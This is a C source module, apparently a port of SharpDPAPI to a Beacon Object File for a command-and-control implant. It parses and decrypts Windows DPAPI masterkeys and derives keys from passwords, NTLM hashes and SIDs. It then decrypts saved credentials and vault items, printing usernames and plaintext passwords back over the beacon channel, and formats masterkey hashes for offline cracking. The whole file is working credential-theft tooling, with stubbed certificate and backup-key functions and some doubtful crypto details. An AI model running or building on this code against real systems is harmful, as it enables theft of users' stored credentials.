/*
 * dpapi.c — Core DPAPI parsing and masterkey decryption
 * Ported from SharpDPAPI/lib/Dpapi.cs (2203 lines of C#)
 *
 * This is the largest and most critical shared module.
 * It handles:
 *   - DPAPI blob parsing and decryption
 *   - Masterkey file parsing and decryption
 *   - Credential file parsing
 *   - Vault policy/credential parsing
 *   - Certificate private key parsing
 *   - Masterkey cache management
 */
#include "dpapi_common.h"
#include "beacon.h"

/* ============================================================
 * Masterkey Cache Operations
 * ============================================================ */

void mk_cache_init(MASTERKEY_CACHE* cache) {
    cache->head = NULL;
    cache->count = 0;
}

void mk_cache_free(MASTERKEY_CACHE* cache) {
    MASTERKEY_CACHE_ENTRY* entry = cache->head;
    while (entry) {
        MASTERKEY_CACHE_ENTRY* next = entry->next;
        intFree(entry);
        entry = next;
    }
    cache->head = NULL;
    cache->count = 0;
}

BOOL mk_cache_add(MASTERKEY_CACHE* cache, const GUID* guid, const BYTE* sha1) {
    /* Check if already exists */
    if (mk_cache_lookup(cache, guid)) return TRUE;

    MASTERKEY_CACHE_ENTRY* entry = (MASTERKEY_CACHE_ENTRY*)intAlloc(sizeof(MASTERKEY_CACHE_ENTRY));
    if (!entry) return FALSE;

    memcpy(&entry->guid, guid, sizeof(GUID));
    memcpy(entry->sha1, sha1, 20);
    entry->next = cache->head;
    cache->head = entry;
    cache->count++;
    return TRUE;
}

BYTE* mk_cache_lookup(MASTERKEY_CACHE* cache, const GUID* guid) {
    MASTERKEY_CACHE_ENTRY* entry = cache->head;
    while (entry) {
        if (memcmp(&entry->guid, guid, sizeof(GUID)) == 0)
            return entry->sha1;
        entry = entry->next;
    }
    return NULL;
}

void mk_cache_print(MASTERKEY_CACHE* cache) {
    MASTERKEY_CACHE_ENTRY* entry = cache->head;
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Masterkey Cache: %d entries\n", cache->count);
    while (entry) {
        char* guid_str = guid_to_string(&entry->guid);
        char* sha1_hex = bytes_to_hex(entry->sha1, 20);
        if (guid_str && sha1_hex) {
            BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s\n", guid_str, sha1_hex);
        }
        if (guid_str) intFree(guid_str);
        if (sha1_hex) intFree(sha1_hex);
        entry = entry->next;
    }
}

/* ============================================================
 * DPAPI Blob Parsing
 * ============================================================ */

BOOL parse_dpapi_blob(const BYTE* raw, int raw_len, DPAPI_BLOB* blob) {
    if (!raw || raw_len < 36 || !blob) return FALSE;
    memset(blob, 0, sizeof(DPAPI_BLOB));

    int offset = 0;

    /* Version (4 bytes) */
    blob->version = *(DWORD*)(raw + offset);
    offset += 4;

    /* Credential provider GUID (16 bytes) */
    memcpy(&blob->provider, raw + offset, 16);
    offset += 16;

    /* Master key GUID (16 bytes) */
    memcpy(&blob->masterkey_guid, raw + offset, 16);
    offset += 16;

    /* Flags (4 bytes) */
    blob->flags = *(DWORD*)(raw + offset);
    offset += 4;

    /* Description length (4 bytes) + description */
    blob->description_len = *(DWORD*)(raw + offset);
    offset += 4;

    if (blob->description_len > 0) {
        if (offset + (int)blob->description_len > raw_len) return FALSE;
        blob->description = (wchar_t*)intAlloc(blob->description_len + 2);
        if (blob->description) {
            memcpy(blob->description, raw + offset, blob->description_len);
        }
        offset += blob->description_len;
    }

    /* Crypto algorithm (4 bytes) */
    if (offset + 4 > raw_len) return FALSE;
    blob->alg_crypt = *(DWORD*)(raw + offset);
    offset += 4;

    /* Crypto algorithm key length (4 bytes) */
    if (offset + 4 > raw_len) return FALSE;
    blob->alg_crypt_len = *(DWORD*)(raw + offset);
    offset += 4;

    /* Salt length (4 bytes) + salt */
    if (offset + 4 > raw_len) return FALSE;
    blob->salt_len = *(DWORD*)(raw + offset);
    offset += 4;

    if (blob->salt_len > 0) {
        if (offset + (int)blob->salt_len > raw_len) return FALSE;
        blob->salt = (BYTE*)intAlloc(blob->salt_len);
        if (blob->salt) memcpy(blob->salt, raw + offset, blob->salt_len);
        offset += blob->salt_len;
    }

    /* HMAC key length (4 bytes) + hmac key */
    if (offset + 4 > raw_len) return FALSE;
    blob->hmac_key_len = *(DWORD*)(raw + offset);
    offset += 4;

    if (blob->hmac_key_len > 0) {
        if (offset + (int)blob->hmac_key_len > raw_len) return FALSE;
        blob->hmac_key = (BYTE*)intAlloc(blob->hmac_key_len);
        if (blob->hmac_key) memcpy(blob->hmac_key, raw + offset, blob->hmac_key_len);
        offset += blob->hmac_key_len;
    }

    /* Hash algorithm (4 bytes) */
    if (offset + 4 > raw_len) return FALSE;
    blob->alg_hash = *(DWORD*)(raw + offset);
    offset += 4;

    /* Hash algorithm length (4 bytes) */
    if (offset + 4 > raw_len) return FALSE;
    blob->alg_hash_len = *(DWORD*)(raw + offset);
    offset += 4;

    /* HMAC length (4 bytes) + HMAC */
    if (offset + 4 > raw_len) return FALSE;
    blob->hmac_len = *(DWORD*)(raw + offset);
    offset += 4;

    if (blob->hmac_len > 0) {
        if (offset + (int)blob->hmac_len > raw_len) return FALSE;
        blob->hmac = (BYTE*)intAlloc(blob->hmac_len);
        if (blob->hmac) memcpy(blob->hmac, raw + offset, blob->hmac_len);
        offset += blob->hmac_len;
    }

    /* Encrypted data length (4 bytes) + data */
    if (offset + 4 > raw_len) return FALSE;
    blob->data_len = *(DWORD*)(raw + offset);
    offset += 4;

    if (blob->data_len > 0) {
        if (offset + (int)blob->data_len > raw_len) return FALSE;
        blob->data = (BYTE*)intAlloc(blob->data_len);
        if (blob->data) memcpy(blob->data, raw + offset, blob->data_len);
        offset += blob->data_len;
    }

    /* Signature length (4 bytes) + signature */
    if (offset + 4 <= raw_len) {
        blob->sign_len = *(DWORD*)(raw + offset);
        offset += 4;

        if (blob->sign_len > 0 && offset + (int)blob->sign_len <= raw_len) {
            blob->sign = (BYTE*)intAlloc(blob->sign_len);
            if (blob->sign) memcpy(blob->sign, raw + offset, blob->sign_len);
        }
    }

    return TRUE;
}

void free_dpapi_blob(DPAPI_BLOB* blob) {
    if (!blob) return;
    if (blob->description) intFree(blob->description);
    if (blob->salt) intFree(blob->salt);
    if (blob->hmac_key) intFree(blob->hmac_key);
    if (blob->hmac) intFree(blob->hmac);
    if (blob->data) intFree(blob->data);
    if (blob->sign) intFree(blob->sign);
    memset(blob, 0, sizeof(DPAPI_BLOB));
}

/* ---- Describe and optionally decrypt a DPAPI blob ---- */
BOOL describe_dpapi_blob(const BYTE* raw, int raw_len,
                         MASTERKEY_CACHE* cache,
                         BOOL unprotect,
                         char** output) {
    DPAPI_BLOB blob;
    if (!parse_dpapi_blob(raw, raw_len, &blob)) return FALSE;

    /* Display blob metadata */
    char* guid_str = guid_to_string(&blob.masterkey_guid);
    char* provider_str = guid_to_string(&blob.provider);

    BeaconPrintf(CALLBACK_OUTPUT, "    version        : %d\n", blob.version);
    if (provider_str) {
        BeaconPrintf(CALLBACK_OUTPUT, "    provider       : %s\n", provider_str);
        intFree(provider_str);
    }

    if (guid_str) {
        BeaconPrintf(CALLBACK_OUTPUT, "    masterkey GUID : %s\n", guid_str);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "    flags          : 0x%08x\n", blob.flags);

    if (blob.description) {
        char* desc = wide_to_utf8(blob.description);
        if (desc) {
            BeaconPrintf(CALLBACK_OUTPUT, "    description    : %s\n", desc);
            intFree(desc);
        }
    }

    /* Identify algorithms */
    const char* alg_crypt_name = "Unknown";
    switch (blob.alg_crypt) {
        case CALG_3DES: alg_crypt_name = "3DES"; break;
        case CALG_AES_256: alg_crypt_name = "AES-256"; break;
        case CALG_AES_128: alg_crypt_name = "AES-128"; break;
        case CALG_AES_192: alg_crypt_name = "AES-192"; break;
    }

    const char* alg_hash_name = "Unknown";
    switch (blob.alg_hash) {
        case CALG_SHA1: alg_hash_name = "SHA1"; break;
        case CALG_SHA_256: alg_hash_name = "SHA256"; break;
        case CALG_SHA_512: alg_hash_name = "SHA512"; break;
        case CALG_HMAC: alg_hash_name = "HMAC"; break;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "    algCrypt       : %s (0x%x)\n", alg_crypt_name, blob.alg_crypt);
    BeaconPrintf(CALLBACK_OUTPUT, "    algHash        : %s (0x%x)\n", alg_hash_name, blob.alg_hash);

    if (blob.salt) {
        char* salt_hex = bytes_to_hex(blob.salt, blob.salt_len);
        if (salt_hex) {
            BeaconPrintf(CALLBACK_OUTPUT, "    salt           : %s\n", salt_hex);
            intFree(salt_hex);
        }
    }

    /* Attempt decryption if we have the masterkey */
    if (cache && guid_str) {
        BYTE* mk_sha1 = mk_cache_lookup(cache, &blob.masterkey_guid);

        if (mk_sha1) {
            BeaconPrintf(CALLBACK_OUTPUT, "    [*] Masterkey found in cache!\n");

            BYTE* decrypted = NULL;
            int dec_len = 0;

            if (decrypt_blob(blob.data, blob.data_len,
                             mk_sha1, 20,
                             blob.alg_crypt, blob.alg_hash,
                             &decrypted, &dec_len)) {
                char* dec_hex = bytes_to_hex(decrypted, dec_len);
                if (dec_hex) {
                    BeaconPrintf(CALLBACK_OUTPUT, "    decrypted      : %s\n", dec_hex);
                    intFree(dec_hex);
                }

                if (output) {
                    /* Caller wants the decrypted bytes as output */
                    *output = (char*)decrypted;
                    /* Note: caller must interpret as bytes, not string */
                } else {
                    intFree(decrypted);
                }
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "    [!] Decryption failed\n");
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "    [!] Masterkey %s not found in cache\n",
                         guid_str);
        }
    }

    /* CryptUnprotectData path (for /unprotect flag) */
    if (unprotect && !cache) {
        DATA_BLOB dataIn, dataOut;
        dataIn.pbData = (BYTE*)raw;
        dataIn.cbData = raw_len;
        memset(&dataOut, 0, sizeof(dataOut));

#ifdef BOF
        if (CRYPT32$CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
            char* dec_hex = bytes_to_hex(dataOut.pbData, dataOut.cbData);
            if (dec_hex) {
                BeaconPrintf(CALLBACK_OUTPUT, "    decrypted (unprotect) : %s\n", dec_hex);
                intFree(dec_hex);
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dataOut.pbData);
        }
#else
        if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
            char* dec_hex = bytes_to_hex(dataOut.pbData, dataOut.cbData);
            if (dec_hex) {
                BeaconPrintf(CALLBACK_OUTPUT, "    decrypted (unprotect) : %s\n", dec_hex);
                intFree(dec_hex);
            }
            HeapFree(GetProcessHeap(), 0, dataOut.pbData);
        }
#endif
    }

    if (guid_str) intFree(guid_str);
    free_dpapi_blob(&blob);
    return TRUE;
}

/* ============================================================
 * Masterkey Decryption
 * ============================================================ */

/*
 * Decrypt a DPAPI masterkey blob using a pre-key.
 * Pre-key is derived from: password hash, NTLM hash, domain backup key, etc.
 *
 * Masterkey blob structure:
 * [0-3]   version
 * [4-7]   salt length
 * [8+salt_len]  salt
 * [+4]    rounds
 * [+4]    algHash
 * [+4]    algCrypt
 * [+encrypted]  encrypted masterkey
 */
BOOL decrypt_masterkey(const BYTE* mk_bytes, int mk_len,
                       const BYTE* key, int key_len,
                       BYTE* out_sha1) {
    if (!mk_bytes || mk_len < 96 || !key || !out_sha1) return FALSE;

    int offset = 0;

    /* Version */
    DWORD version = *(DWORD*)(mk_bytes + offset);
    offset += 4;

    /* Salt */
    DWORD salt_len = *(DWORD*)(mk_bytes + offset);
    offset += 4;

    if (offset + (int)salt_len > mk_len) return FALSE;
    const BYTE* salt = mk_bytes + offset;
    offset += salt_len;

    /* Iterations/rounds */
    if (offset + 4 > mk_len) return FALSE;
    DWORD rounds = *(DWORD*)(mk_bytes + offset);
    offset += 4;

    /* Hash algorithm */
    if (offset + 4 > mk_len) return FALSE;
    DWORD alg_hash = *(DWORD*)(mk_bytes + offset);
    offset += 4;

    /* Crypt algorithm */
    if (offset + 4 > mk_len) return FALSE;
    DWORD alg_crypt = *(DWORD*)(mk_bytes + offset);
    offset += 4;

    /* Encrypted data */
    const BYTE* enc_data = mk_bytes + offset;
    int enc_len = mk_len - offset;
    if (enc_len <= 0) return FALSE;

    /* Determine PBKDF2 output key length based on crypt algorithm */
    int dk_len;
    switch (alg_crypt) {
        case CALG_3DES:
        case CALG_3DES_112:
            dk_len = 24;  /* 3DES key */
            break;
        case CALG_AES_256:
            dk_len = 32;
            break;
        case CALG_AES_128:
            dk_len = 16;
            break;
        default:
            dk_len = 24;
            break;
    }

    /* Step 1: PBKDF2 with key and salt */
    BYTE derived[64];

    switch (alg_hash) {
        case CALG_SHA1:
            if (!pbkdf2_hmac_sha1(key, key_len, salt, salt_len, rounds, derived, dk_len))
                return FALSE;
            break;
        case CALG_SHA_256:
            if (!pbkdf2_hmac_sha256(key, key_len, salt, salt_len, rounds, derived, dk_len))
                return FALSE;
            break;
        case CALG_SHA_512:
            if (!pbkdf2_hmac_sha512(key, key_len, salt, salt_len, rounds, derived, dk_len))
                return FALSE;
            break;
        default:
            return FALSE;
    }

    /* Step 2: Derive encryption and HMAC keys from PBKDF2 output */
    BYTE final_key[64];
    if (!derive_key(derived, dk_len, alg_hash, final_key, dk_len + 16))
        return FALSE;

    /* Step 3: Decrypt the masterkey blob */
    BYTE* decrypted = NULL;
    int dec_len = 0;

    switch (alg_crypt) {
        case CALG_3DES:
        case CALG_3DES_112:
            if (!triple_des_decrypt(final_key, 24, final_key + 24, 8,
                                    enc_data, enc_len, &decrypted, &dec_len))
                return FALSE;
            break;
        case CALG_AES_256:
            if (!aes_decrypt(final_key, 32, final_key + 32, 16,
                             enc_data, enc_len, &decrypted, &dec_len))
                return FALSE;
            break;
        default:
            return FALSE;
    }

    if (!decrypted || dec_len < 20) {
        if (decrypted) intFree(decrypted);
        return FALSE;
    }

    /* Step 4: The decrypted masterkey — compute SHA1 hash for the cache */
    int mk_actual_len = dec_len;
    sha1_hash(decrypted, mk_actual_len, out_sha1);

    intFree(decrypted);
    return TRUE;
}

/* ---- SHA-based masterkey decryption (domain backup key path) ---- */
BOOL decrypt_masterkey_with_sha(const BYTE* mk_bytes, int mk_len,
                                const BYTE* sha_key, int key_len,
                                BYTE* out_sha1) {
    /* For domain backup key (PVK) decryption:
     * Use the SHA1 of the backup key as the pre-key */
    return decrypt_masterkey(mk_bytes, mk_len, sha_key, key_len, out_sha1);
}

/* ---- Derive pre-key from password ---- */
BOOL derive_pre_key(const char* password, const char* sid,
                    BOOL is_domain, int hash_type,
                    BYTE** out_key, int* key_len) {
    /*
     * User pre-key derivation:
     * 1. password -> NTLM hash (MD4 of UTF-16LE password)
     * 2. Or password -> SHA1 or SHA256 based on version
     * 3. Combine with SID
     */
    if (!password || !sid) return FALSE;

    /* Convert password to UTF-16LE */
    wchar_t* wpass = utf8_to_wide(password);
    if (!wpass) return FALSE;

    int wpass_len = wcslen(wpass) * sizeof(wchar_t);

    if (hash_type == 1) {
        /* SHA1 path */
        BYTE sha1[20];
        sha1_hash((BYTE*)wpass, wpass_len, sha1);

        /* Append SID bytes */
        wchar_t* wsid = utf8_to_wide(sid);
        if (!wsid) { intFree(wpass); return FALSE; }

        int sid_bytes_len = wcslen(wsid) * sizeof(wchar_t);
        int combined_len = 20 + sid_bytes_len;
        BYTE* combined = (BYTE*)intAlloc(combined_len);
        if (!combined) { intFree(wpass); intFree(wsid); return FALSE; }

        memcpy(combined, sha1, 20);
        memcpy(combined + 20, wsid, sid_bytes_len);

        /* HMAC-SHA1 with SHA1(password) as key */
        *out_key = (BYTE*)intAlloc(20);
        if (!*out_key) { intFree(combined); intFree(wpass); intFree(wsid); return FALSE; }

        BOOL result = hmac_sha1(sha1, 20, (BYTE*)wsid, sid_bytes_len, *out_key);
        *key_len = 20;

        intFree(combined);
        intFree(wpass);
        intFree(wsid);
        return result;
    } else if (hash_type == 2) {
        /* NTLM path */
        BYTE ntlm[16];
        md4_hash((BYTE*)wpass, wpass_len, ntlm);

        /* The pre-key is HMAC-SHA1(NTLM, SID-as-UTF16LE) */
        wchar_t* wsid = utf8_to_wide(sid);
        if (!wsid) { intFree(wpass); return FALSE; }

        *out_key = (BYTE*)intAlloc(20);
        if (!*out_key) { intFree(wpass); intFree(wsid); return FALSE; }

        BOOL result = hmac_sha1(ntlm, 16, (BYTE*)wsid,
                                wcslen(wsid) * sizeof(wchar_t), *out_key);
        *key_len = 20;

        intFree(wpass);
        intFree(wsid);
        return result;
    }

    intFree(wpass);
    return FALSE;
}

/* ============================================================
 * Credential Parsing
 * ============================================================ */

BOOL describe_credential(const BYTE* data, int data_len,
                         MASTERKEY_CACHE* cache,
                         char** output) {
    /*
     * Credential file structure:
     * [0-3]   version
     * [4-7]   size
     * [8-11]  unknown
     * [12+]   DPAPI blob
     */
    if (!data || data_len < 36) return FALSE;

    DWORD version = *(DWORD*)(data + 0);
    DWORD size = *(DWORD*)(data + 4);

    BeaconPrintf(CALLBACK_OUTPUT, "\n  Credential blob\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    version  : %d\n", version);
    BeaconPrintf(CALLBACK_OUTPUT, "    size     : %d\n", size);

    /* The DPAPI blob starts at offset 12 */
    int blob_offset = 12;
    if (blob_offset >= data_len) return FALSE;

    return describe_dpapi_blob(data + blob_offset, data_len - blob_offset,
                               cache, FALSE, output);
}

/* ---- Parse decrypted credential blob ---- */
BOOL parse_dec_cred_blob(const BYTE* data, int data_len, char** output) {
    /*
     * Decrypted credential structure:
     * [0-3]     unknown
     * [4-7]     cred size
     * [8-11]    unknown
     * [12+]     CRED_BLOB:
     *   [0-3]   flags
     *   [4-7]   type
     *   [8+]    target name (length-prefixed unicode string)
     *   [+]     comment
     *   [+]     last written FILETIME
     *   [+]     credential blob size
     *   [+]     credential blob
     *   [+]     persist
     *   [+]     attribute count
     *   [+]     attributes (repeated)
     *   [+]     target alias
     *   [+]     username
     */
    if (!data || data_len < 24) return FALSE;

    int offset = 0;

    /* Skip initial header */
    offset += 4; /* unknown flags */

    DWORD cred_size = *(DWORD*)(data + offset);
    offset += 4;

    offset += 4; /* unknown */

    /* Now at the CREDENTIAL structure */
    if (offset + 16 > data_len) return FALSE;

    DWORD flags = *(DWORD*)(data + offset); offset += 4;
    DWORD type = *(DWORD*)(data + offset); offset += 4;

    /* Target name */
    if (offset + 4 > data_len) return FALSE;
    DWORD target_len = *(DWORD*)(data + offset); offset += 4;
    const wchar_t* target = NULL;
    if (target_len > 0 && offset + (int)target_len <= data_len) {
        target = (const wchar_t*)(data + offset);
        offset += target_len;
    }

    /* Comment */
    if (offset + 4 > data_len) return FALSE;
    DWORD comment_len = *(DWORD*)(data + offset); offset += 4;
    const wchar_t* comment = NULL;
    if (comment_len > 0 && offset + (int)comment_len <= data_len) {
        comment = (const wchar_t*)(data + offset);
        offset += comment_len;
    }

    /* Last written (8 bytes FILETIME) */
    if (offset + 8 > data_len) return FALSE;
    offset += 8;

    /* Credential blob size + data */
    if (offset + 4 > data_len) return FALSE;
    DWORD cred_blob_size = *(DWORD*)(data + offset); offset += 4;
    const BYTE* cred_blob = NULL;
    if (cred_blob_size > 0 && offset + (int)cred_blob_size <= data_len) {
        cred_blob = data + offset;
        offset += cred_blob_size;
    }

    /* Persist */
    if (offset + 4 > data_len) return FALSE;
    DWORD persist = *(DWORD*)(data + offset); offset += 4;

    /* Attribute count */
    if (offset + 4 > data_len) return FALSE;
    offset += 4; /* skip attribute count + attributes for now */

    /* Skip attributes — they are variable-length */

    /* Target alias */
    if (offset + 4 <= data_len) {
        DWORD alias_len = *(DWORD*)(data + offset); offset += 4;
        if (alias_len > 0) offset += alias_len;
    }

    /* Username */
    const wchar_t* username = NULL;
    if (offset + 4 <= data_len) {
        DWORD user_len = *(DWORD*)(data + offset); offset += 4;
        if (user_len > 0 && offset + (int)user_len <= data_len) {
            username = (const wchar_t*)(data + offset);
        }
    }

    /* Print results */
    if (target) {
        char* t = wide_to_utf8(target);
        if (t) { BeaconPrintf(CALLBACK_OUTPUT, "    Target     : %s\n", t); intFree(t); }
    }
    if (username) {
        char* u = wide_to_utf8(username);
        if (u) { BeaconPrintf(CALLBACK_OUTPUT, "    Username   : %s\n", u); intFree(u); }
    }
    if (cred_blob && cred_blob_size > 0) {
        /* Try to display as string first */
        char* pw = wide_to_utf8((const wchar_t*)cred_blob);
        if (pw) {
            BeaconPrintf(CALLBACK_OUTPUT, "    Password   : %s\n", pw);
            intFree(pw);
        } else {
            char* hex = bytes_to_hex(cred_blob, cred_blob_size);
            if (hex) {
                BeaconPrintf(CALLBACK_OUTPUT, "    Cred Blob  : %s\n", hex);
                intFree(hex);
            }
        }
    }

    return TRUE;
}

/* ============================================================
 * Vault Parsing
 * ============================================================ */

BOOL describe_vault_policy(const BYTE* data, int data_len,
                           MASTERKEY_CACHE* cache,
                           BYTE** aes128_key, BYTE** aes256_key,
                           char** output) {
    /*
     * Policy.vpol structure:
     * [0-3]    version
     * [4-19]   GUID
     * [20-23]  description length
     * [24+]    description (UTF-16)
     * [+4]     unknown
     * [+4]     key1 size
     * [+key1]  DPAPI blob (AES128 vault key)
     * [+4]     key2 size
     * [+key2]  DPAPI blob (AES256 vault key)
     */
    if (!data || data_len < 40) return FALSE;

    int offset = 0;
    DWORD version = *(DWORD*)(data + offset); offset += 4;

    GUID vpol_guid;
    memcpy(&vpol_guid, data + offset, 16); offset += 16;

    BeaconPrintf(CALLBACK_OUTPUT, "\n  Vault Policy\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    version  : %d\n", version);

    char* guid_str = guid_to_string(&vpol_guid);
    if (guid_str) {
        BeaconPrintf(CALLBACK_OUTPUT, "    GUID     : %s\n", guid_str);
        intFree(guid_str);
    }

    /* Description */
    if (offset + 4 > data_len) return TRUE;
    DWORD desc_len = *(DWORD*)(data + offset); offset += 4;
    if (desc_len > 0 && offset + (int)desc_len <= data_len) {
        char* desc = wide_to_utf8((wchar_t*)(data + offset));
        if (desc) {
            BeaconPrintf(CALLBACK_OUTPUT, "    name     : %s\n", desc);
            intFree(desc);
        }
        offset += desc_len;
    }

    /* Unknown + key sections */
    if (offset + 12 > data_len) return TRUE;
    offset += 4; /* unknown */

    /* Key 1 (AES128) */
    DWORD key1_size = *(DWORD*)(data + offset); offset += 4;
    if (key1_size > 0 && offset + (int)key1_size <= data_len) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n  --- Key 1 (AES-128) ---\n");
        char* dec_key = NULL;
        describe_dpapi_blob(data + offset, key1_size, cache, FALSE, &dec_key);
        if (dec_key && aes128_key) {
            *aes128_key = (BYTE*)dec_key;
        }
        offset += key1_size;
    }

    /* Key 2 (AES256) */
    if (offset + 4 <= data_len) {
        DWORD key2_size = *(DWORD*)(data + offset); offset += 4;
        if (key2_size > 0 && offset + (int)key2_size <= data_len) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n  --- Key 2 (AES-256) ---\n");
            char* dec_key = NULL;
            describe_dpapi_blob(data + offset, key2_size, cache, FALSE, &dec_key);
            if (dec_key && aes256_key) {
                *aes256_key = (BYTE*)dec_key;
            }
        }
    }

    return TRUE;
}

BOOL describe_vault_cred(const BYTE* data, int data_len,
                         const BYTE* aes128_key, const BYTE* aes256_key,
                         char** output) {
    /*
     * Vault credential (.vcrd) has AES-encrypted properties.
     * Decrypt using the vault policy keys (AES128 or AES256).
     */
    if (!data || data_len < 32) return FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "\n  Vault Credential\n");

    int offset = 0;

    /* Schema GUID */
    GUID schema;
    memcpy(&schema, data + offset, 16);
    offset += 16;

    char* schema_str = guid_to_string(&schema);
    if (schema_str) {
        BeaconPrintf(CALLBACK_OUTPUT, "    schema   : %s\n", schema_str);
        intFree(schema_str);
    }

    /* Last modified */
    if (offset + 8 <= data_len) {
        offset += 8; /* FILETIME */
    }

    /* Unknown */
    if (offset + 4 <= data_len) offset += 4;
    if (offset + 4 <= data_len) offset += 4;

    /* Properties count */
    if (offset + 4 > data_len) return TRUE;
    DWORD prop_count = *(DWORD*)(data + offset); offset += 4;

    BeaconPrintf(CALLBACK_OUTPUT, "    prop count : %d\n", prop_count);

    /* Parse properties */
    for (DWORD i = 0; i < prop_count && offset < data_len; i++) {
        if (offset + 8 > data_len) break;

        DWORD prop_id = *(DWORD*)(data + offset); offset += 4;
        DWORD prop_size = *(DWORD*)(data + offset); offset += 4;

        if (prop_size == 0 || offset + (int)prop_size > data_len) {
            offset += prop_size;
            continue;
        }

        /* Try AES decrypt */
        const BYTE* key = NULL;
        int key_len = 0;

        if (aes256_key) { key = aes256_key; key_len = 32; }
        else if (aes128_key) { key = aes128_key; key_len = 16; }

        if (key) {
            /* Vault properties are AES-CBC encrypted with a 16-byte IV */
            if (prop_size > 16) {
                BYTE* dec = NULL;
                int dec_len = 0;
                if (aes_decrypt(key, key_len,
                                data + offset, 16,       /* IV */
                                data + offset + 16, prop_size - 16, /* data */
                                &dec, &dec_len)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "    prop %d : (decrypted %d bytes)\n",
                                 prop_id, dec_len);
                    /* Try to display as text */
                    char* text = wide_to_utf8((wchar_t*)dec);
                    if (text && strlen(text) > 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "             %s\n", text);
                    }
                    if (text) intFree(text);
                    intFree(dec);
                }
            }
        }

        offset += prop_size;
    }

    return TRUE;
}

BOOL describe_vault_item(const BYTE* data, int data_len, char** output) {
    /* Basic vault item display */
    if (!data || data_len < 16) return FALSE;

    char* hex = bytes_to_hex(data, data_len > 64 ? 64 : data_len);
    if (hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    vault item: %s%s\n",
                     hex, data_len > 64 ? "..." : "");
        intFree(hex);
    }
    return TRUE;
}

/* ============================================================
 * Preferred Key (auto-discovery which masterkey is current)
 * ============================================================ */

GUID get_preferred_key(const BYTE* preferred_bytes, int pref_len) {
    GUID guid;
    memset(&guid, 0, sizeof(GUID));

    if (preferred_bytes && pref_len >= 16) {
        memcpy(&guid, preferred_bytes, 16);
    }
    return guid;
}

/* ============================================================
 * Hash Output (JTR / Hashcat formats)
 * ============================================================ */

char* format_hash(const BYTE* mk_bytes, int mk_len, const char* sid) {
    /*
     * Format: $DPAPImk$<version>*<user_sid>*<salt_hex>*<rounds>*<hash_alg>*<crypt_alg>*<encrypted_hex>
     */
    if (!mk_bytes || mk_len < 32 || !sid) return NULL;

    /* Extract fields from masterkey blob */
    int offset = 0;
    DWORD version = *(DWORD*)(mk_bytes + offset); offset += 4;
    DWORD salt_len = *(DWORD*)(mk_bytes + offset); offset += 4;

    if (offset + (int)salt_len > mk_len) return NULL;
    const BYTE* salt = mk_bytes + offset; offset += salt_len;

    if (offset + 12 > mk_len) return NULL;
    DWORD rounds = *(DWORD*)(mk_bytes + offset); offset += 4;
    DWORD alg_hash = *(DWORD*)(mk_bytes + offset); offset += 4;
    DWORD alg_crypt = *(DWORD*)(mk_bytes + offset); offset += 4;

    const BYTE* enc_data = mk_bytes + offset;
    int enc_len = mk_len - offset;

    char* salt_hex = bytes_to_hex(salt, salt_len);
    char* enc_hex = bytes_to_hex(enc_data, enc_len);

    if (!salt_hex || !enc_hex) {
        if (salt_hex) intFree(salt_hex);
        if (enc_hex) intFree(enc_hex);
        return NULL;
    }

    /* Build hash string */
    int total_len = 64 + strlen(sid) + strlen(salt_hex) + strlen(enc_hex);
    char* hash = (char*)intAlloc(total_len);
    if (hash) {
        sprintf(hash, "$DPAPImk$%d*%s*%s*%d*%d*%d*%s",
                version, sid, salt_hex, rounds, alg_hash, alg_crypt, enc_hex);
    }

    intFree(salt_hex);
    intFree(enc_hex);
    return hash;
}

/* ============================================================
 * Certificate Parsing (stubs for Phase 3)
 * ============================================================ */

BOOL describe_dpapi_cert_private_key(const BYTE* data, int data_len,
                                     MASTERKEY_CACHE* cache,
                                     BOOL is_machine,
                                     char** output,
                                     BYTE** private_key, int* pk_len) {
    /* TODO: Implement in Phase 3 */
    return FALSE;
}

BOOL describe_certificate(const BYTE* cert_data, int cert_len,
                          const BYTE* private_key, int pk_len,
                          char** output) {
    /* TODO: Implement in Phase 3 */
    return FALSE;
}

BOOL describe_cng_cert_blob(const BYTE* data, int data_len,
                            MASTERKEY_CACHE* cache,
                            char** output) {
    /* TODO: Implement in Phase 3 */
    return FALSE;
}

BOOL describe_capi_cert_blob(const BYTE* data, int data_len,
                             MASTERKEY_CACHE* cache,
                             char** output) {
    /* TODO: Implement in Phase 3 */
    return FALSE;
}

/* ============================================================
 * PVK Triage (stub for Phase 2)
 * ============================================================ */

BOOL pvk_triage(const BYTE* pvk_data, int pvk_len,
                MASTERKEY_CACHE* cache,
                char** output) {
    /* TODO: Implement domain backup key triage */
    return FALSE;
}

/* ============================================================
 * Policy blob parsing
 * ============================================================ */

BOOL parse_dec_policy_blob(const BYTE* data, int data_len, char** output) {
    /* Decrypted policy blob contains the actual vault keys */
    if (!data || data_len < 16) return FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "    Decrypted policy blob (%d bytes)\n", data_len);
    return TRUE;
}
